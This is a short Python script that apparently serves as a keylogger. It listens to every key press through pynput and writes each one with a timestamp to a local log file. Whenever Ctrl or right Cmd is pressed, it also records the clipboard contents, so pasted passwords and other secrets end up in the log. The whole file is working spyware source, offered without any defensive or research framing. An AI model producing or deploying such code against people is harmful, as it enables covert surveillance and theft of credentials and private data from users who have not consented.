import pyperclip
from pynput.keyboard import Listener
from datetime import datetime

LOGFILE = './logs/keystroke.log'

def log_key(rkey):
    key = str(rkey).replace("'","")
    line_send = None
    now = str(datetime.now())

    # Check if the Command or Control key is pressed
    if (key == 'key.ctrl'):
        line_send = f"{now} : ClipBoard - {pyperclip.paste()}"
    elif (key == 'key.cmd_r'):
        line_send = f"{now} : ClipBoard - {pyperclip.paste()}"
    else:
        line_send = f"{now} : KeyPress - {key}"
    
    # Write to log file
    with open(LOGFILE,'a') as o:
        o.write(f"{line_send}\n")


# Function main()
def main():
    # checks if the keyboard is being pressed and once it is, leads to function log_key()
    with Listener(on_press=log_key) as l:
        l.join()

# Tells Python to run the main function as the major function
if __name__ == "__main__":
    main()
